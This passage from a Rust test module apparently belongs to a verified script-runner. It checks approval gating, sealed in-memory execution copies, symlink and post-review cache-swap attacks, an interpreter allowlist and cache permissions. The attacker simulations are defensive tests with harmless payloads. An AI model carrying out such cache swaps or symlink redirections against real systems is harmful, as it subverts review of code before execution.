                    }
                    Err(error) => panic!("test server accept failed: {error}"),
                }
            }
        });

        let executor_called = Arc::new(AtomicBool::new(false));
        let called = Arc::clone(&executor_called);
        let result = run_with_verified_executor(
            RunOptions {
                url: format!("http://{address}/approval.sh"),
                no_exec: false,
                interactive: true,
                expected_sha256: Some(expected_sha256),
                exec_fn: None,
            },
            Box::new(move |_, _| {
                called.store(true, Ordering::Release);
                panic!("pending approval reached the executor")
            }),
        )
        .expect("pending approval returns a structured refusal");
        stop.store(true, Ordering::Release);
        server.join().expect("join approval test server");

        assert!(result.refused);
        assert!(!result.executed);
        assert_eq!(result.exit_code, Some(Action::Block.exit_code()));
        assert!(!executor_called.load(Ordering::Acquire));
        let verdict = result.verdict.expect("pending approval verdict");
        assert_eq!(verdict.action, Action::Allow);
        assert_eq!(verdict.requires_approval, Some(true));
        assert!(verdict.bypass_requested);
        assert!(verdict.bypass_available);
        assert!(!verdict.bypass_honored);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn reviewed_script_memfd_is_fully_sealed_and_rejects_pwrite() {
        use std::os::fd::AsRawFd as _;
        use std::os::unix::fs::MetadataExt as _;
        use std::os::unix::process::CommandExt as _;

        let dir = tempfile::tempdir().unwrap();
        let content = b"#!/bin/sh\nprintf 'clean\\n'\n";
        let sha = sha256_hex(content);
        let execution = materialize_execution_file(dir.path(), content, &sha).unwrap();
        assert_eq!(
            execution.read_verified(content.len(), &sha).unwrap(),
            content
        );
        let fd = execution.sealed_file.as_raw_fd();
        let metadata = std::fs::metadata(format!("/proc/self/fd/{fd}")).unwrap();
        assert_eq!(metadata.mode() & 0o777, 0o400);
        let required =
            libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
        assert_eq!(
            unsafe { libc::fcntl(fd, libc::F_GET_SEALS) } & required,
            required
        );
        let replacement = b'X';
        assert_eq!(
            unsafe { libc::pwrite(fd, (&replacement as *const u8).cast(), 1, 0) },
            -1
        );
        assert_eq!(
            std::io::Error::last_os_error().raw_os_error(),
            Some(libc::EPERM)
        );

        let mut command = Command::new("/bin/sh");
        command.arg(format!("/proc/self/fd/{fd}"));
        unsafe {
            command.pre_exec(move || {
                if libc::fcntl(fd, libc::F_SETFD, 0) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
        let output = command.output().expect("execute reviewed sealed script");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"clean\n");
    }

    #[cfg(unix)]
    #[test]
    fn precreated_cache_symlink_never_redirects_download_bytes() {
        use std::os::unix::fs::symlink;

        let dir = tempfile::tempdir().unwrap();
        let cache_dir = dir.path().join("cache");
        std::fs::create_dir(&cache_dir).unwrap();
        let content = b"#!/bin/sh\nprintf 'reviewed\\n'\n";
        let sha = sha256_hex(content);
        let cache_path = cache_dir.join(&sha);
        let victim = dir.path().join("victim");
        let victim_content = b"must remain unchanged";
        std::fs::write(&victim, victim_content).unwrap();
        symlink(&victim, &cache_path).unwrap();

        persist_cache_entry(&cache_dir, &cache_path, content).unwrap();

        assert_eq!(std::fs::read(&victim).unwrap(), victim_content);
        assert!(
            !std::fs::symlink_metadata(&cache_path)
                .unwrap()
                .file_type()
                .is_symlink(),
            "atomic cache publication must replace, never follow, a precreated symlink"
        );
        assert_eq!(std::fs::read(&cache_path).unwrap(), content);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn post_review_cache_swap_cannot_change_execution_bytes() {
        use std::os::fd::AsRawFd as _;
        use std::os::unix::process::CommandExt as _;
        use std::sync::{Arc, Barrier};

        let dir = tempfile::tempdir().unwrap();
        let cache_dir = dir.path().join("cache");
        std::fs::create_dir(&cache_dir).unwrap();
        let content = b"#!/bin/sh\nprintf 'reviewed\\n'\n";
        let sha = sha256_hex(content);
        let cache_path = cache_dir.join(&sha);
        persist_cache_entry(&cache_dir, &cache_path, content).unwrap();

        // Exercise the real in-memory review before simulating an attacker who
        // swaps the stable content-addressed cache pathname after approval.
        let review = review_script_bytes(content, true, false, Some(dir.path()), None)
            .expect("review clean script bytes");
        assert!(review.analysis_complete);
        let execution = materialize_execution_file(&cache_dir, content, &sha).unwrap();
        let fd = execution.sealed_file.as_raw_fd();
        let barrier = Arc::new(Barrier::new(2));
        let attacker_barrier = Arc::clone(&barrier);
        let attacker_cache = cache_path.clone();
        let attacker = std::thread::spawn(move || {
            attacker_barrier.wait();
            std::fs::remove_file(&attacker_cache).unwrap();
            std::fs::write(&attacker_cache, b"#!/bin/sh\nprintf 'replaced\\n'\n").unwrap();
            let replacement = b'X';
            assert_eq!(
                unsafe { libc::pwrite(fd, (&replacement as *const u8).cast(), 1, 0) },
                -1
            );
            attacker_barrier.wait();
        });
        barrier.wait();
        barrier.wait();
        attacker.join().unwrap();

        assert_eq!(
            execution.read_verified(content.len(), &sha).unwrap(),
            content
        );
        let mut command = Command::new("/bin/sh");
        command.arg(format!("/proc/self/fd/{fd}"));
        unsafe {
            command.pre_exec(move || {
                if libc::fcntl(fd, libc::F_SETFD, 0) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
        let output = command.output().expect("execute sealed reviewed copy");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"reviewed\n");
    }

    #[test]
    fn test_allowed_interpreter_sh() {
        assert!(is_allowed_interpreter("sh"));
    }

    #[test]
    fn test_allowed_interpreter_python3() {
        assert!(is_allowed_interpreter("python3"));
    }

    #[test]
    fn test_allowed_interpreter_python3_11() {
        assert!(is_allowed_interpreter("python3.11"));
    }

    #[test]
    fn test_allowed_interpreter_nodejs() {
        assert!(is_allowed_interpreter("nodejs"));
    }

    #[test]
    fn test_disallowed_interpreter_vim() {
        assert!(!is_allowed_interpreter("vim"));
    }

    #[test]
    fn test_disallowed_interpreter_expect() {
        assert!(!is_allowed_interpreter("expect"));
    }

    #[test]
    fn test_disallowed_interpreter_python_evil() {
        assert!(!is_allowed_interpreter("python.evil"));
    }

    #[test]
    fn test_disallowed_interpreter_node_sass() {
        assert!(!is_allowed_interpreter("node-sass"));
    }

    #[test]
    fn test_disallowed_interpreter_python3_trailing_dot() {
        assert!(!is_allowed_interpreter("python3."));
    }

    #[test]
    fn test_disallowed_interpreter_python3_double_dot() {
        assert!(!is_allowed_interpreter("python3..11"));
    }

    #[test]
    fn test_allowed_interpreter_strips_path() {
        assert!(is_allowed_interpreter("/usr/bin/bash"));
    }

    #[cfg(unix)]
    #[test]
    fn test_cache_write_permissions_0600() {
        use std::os::unix::fs::PermissionsExt;
        use tempfile::NamedTempFile;

        let dir = tempfile::tempdir().unwrap();
        let cache_path = dir.path().join("test_cache");

        {
            use std::io::Write;

            let mut tmp = NamedTempFile::new_in(dir.path()).unwrap();
            tmp.as_file()
                .set_permissions(std::fs::Permissions::from_mode(0o600))
                .unwrap();
            tmp.write_all(b"test content").unwrap();
            tmp.persist(&cache_path).unwrap();
        }

        let meta = std::fs::metadata(&cache_path).unwrap();
        assert_eq!(
            meta.permissions().mode() & 0o777,
            0o600,
            "cache file should be 0600"
        );
    }

    #[test]
    fn test_cache_write_no_predictable_tmp() {
        use tempfile::NamedTempFile;

        let dir = tempfile::tempdir().unwrap();
        let sha = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
        let cached_path = dir.path().join(sha);

        {
            use std::io::Write;
            let mut tmp = NamedTempFile::new_in(dir.path()).unwrap();
            tmp.write_all(b"cached script").unwrap();
            tmp.persist(&cached_path).unwrap();
        }

        let entries: Vec<_> = std::fs::read_dir(dir.path())
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .collect();

        assert_eq!(
            entries.len(),
            1,
            "only the cached file should exist, found: {entries:?}"
        );
        assert!(
            cached_path.exists(),
            "cached file should exist after persist"
        );
    }
}
